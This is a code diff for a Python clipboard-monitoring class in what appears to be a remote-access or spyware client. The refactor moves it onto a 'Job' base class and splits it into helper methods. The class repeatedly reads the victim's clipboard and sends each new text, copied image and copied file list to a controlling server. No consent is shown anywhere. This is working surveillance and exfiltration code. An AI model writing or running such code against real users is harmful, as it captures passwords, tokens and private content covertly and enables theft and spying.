@@ -3,52 +3,51 @@ import io
 import threading
 import time
 
-from PIL import ImageGrab, Image
-
-from client.modules.module import Module
+from client.jobs.job import Job
 from common.util import get_size, logger
 
 
-class ClipboardMonitor(Module):
+class ClipboardMonitor(Job):
     def __init__(self):
         super().__init__()
         self.recent_text = None
         self.image_hash = None
         self.file_list = None
+        self.transfer_images = False
+        self.interval = 3
 
     def run(self):
         try:
-            self.send_to_server(1, 'Importing module: pyperclip', 0)
+            time.sleep(2)
             import pyperclip
+            self.send_to_server(1, 'Module imported: pyperclip', 0)
+
+            self.is_running = True
             self.send_to_server(1, 'Clipboard monitoring started', 1)
-            self.status = True
-            while self.status:
-                im = ImageGrab.grabclipboard()
-                if im is None:
-                    clipboard_text = pyperclip.paste()
-                    if clipboard_text != '' and clipboard_text != self.recent_text:
-                        self.recent_text = clipboard_text
-                        self.send_to_server(1, 'Clipboard change detected: {0}'.format(self.recent_text), 0)
-                elif isinstance(im, Image.Image):
-                    image_hash = hashlib.sha256(im.tobytes()).hexdigest()
-                    if image_hash != self.image_hash:
-                        self.image_hash = image_hash
-                        b = io.BytesIO()
-                        im.save(b, 'BMP')
-                        self.send_to_server(1,
-                                            f'Image copy detected, image being sent, length is {get_size(b.getbuffer().nbytes)}',
-                                            0)
-                        self.send_io_to_server(b)
-                        self.send_to_server(1, 'Image has been successfully sent', 0)
-                else:
-                    if isinstance(im, list):
-                        file_list = ', '.join(im)
-                        if file_list != self.file_list:
-                            self.file_list = file_list
-                            self.send_to_server(1, f'Files copy detected: {self.file_list}', 0)
+
+            if self.transfer_images:
+                from PIL import ImageGrab, Image
+                self.send_to_server(1, 'Module imported: pillow', 0)
+                while self.is_running:
+                    im = ImageGrab.grabclipboard()
+                    if im is None:
+                        clipboard_text = pyperclip.paste()
+                        self._handle_text_change(clipboard_text)
+                    elif isinstance(im, Image.Image):
+                        self._handle_image_change(im)
                     else:
-                        print(f'Unsupported type: {im}')
-                time.sleep(3)
+                        if isinstance(im, list):
+                            self._handle_file_change(im)
+                        else:
+                            print(f'Unsupported type: {im}')
+                    time.sleep(self.interval)
+
+            else:
+                while self.is_running:
+                    clipboard_text = pyperclip.paste()
+                    self._handle_text_change(clipboard_text)
+                    time.sleep(self.interval)
+
             self.send_to_server(1, 'Clipboard monitoring stopped', 0)
         except Exception as e:
             self.send_to_server(0, f'Error occurs: {e}', 0)
@@ -56,23 +55,26 @@ class ClipboardMonitor(Module):
             logger.info(f'Thread ended: {threading.current_thread().name}')
             self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)
 
+    def _handle_text_change(self, text: str):
+        """处理文本剪贴板变化"""
+        if text and text != self.recent_text:
+            self.recent_text = text
+            self.send_to_server(1, f'Clipboard text changed: {text}', 0)
 
-"""
-    def run(self):
-        try:
-            self.send_to_server(1, 'Importing module: pyperclip', 0)
-            import pyperclip
-            self.send_to_server(1, 'Clipboard monitoring started', 1)
-            previous_data = pyperclip.paste()
-            self.status = True
-            while self.status:
-                current_data = pyperclip.paste()
-                if current_data != previous_data:
-                    self.send_to_server(1, f'Clipboard content changed: {current_data}', 0)
-                    previous_data = current_data
-                time.sleep(1)
-            self.send_to_server(1, 'Clipboard monitoring stopped', 0)
-        except Exception as e:
-            self.send_to_server(0, f'Error occurs: {e}', 0)
-        self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)
-"""
+    def _handle_image_change(self, im):
+        image_hash = hashlib.sha256(im.tobytes()).hexdigest()
+        if image_hash != self.image_hash:
+            self.image_hash = image_hash
+            b = io.BytesIO()
+            im.save(b, 'BMP')
+            self.send_to_server(1,
+                                f'Image copy detected, image being sent, length is {get_size(b.getbuffer().nbytes)}',
+                                0)
+            self.send_io_to_server(b)
+            self.send_to_server(1, 'Image has been successfully sent', 0)
+
+    def _handle_file_change(self, im):
+        file_list = ', '.join(im)
+        if file_list != self.file_list:
+            self.file_list = file_list
+            self.send_to_server(1, f'Files copy detected: {self.file_list}', 0)
